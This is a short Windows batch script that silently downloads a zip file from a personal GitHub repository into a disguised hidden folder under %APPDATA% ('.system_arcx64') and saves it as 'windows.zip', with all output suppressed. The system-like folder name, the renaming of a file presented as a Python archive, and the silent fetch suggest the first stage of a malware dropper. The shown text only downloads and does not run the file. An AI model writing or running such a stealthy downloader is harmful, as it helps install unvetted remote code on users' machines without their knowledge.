@echo off

set folderPath=%APPDATA%\.system_arcx64

if not exist "%folderPath%\windows.zip" (
    curl https://github.com/faruqer/cheki/raw/refs/heads/main/python-3.12.7.zip -o %folderPath%\windows.zip > NUL 2>&1
)
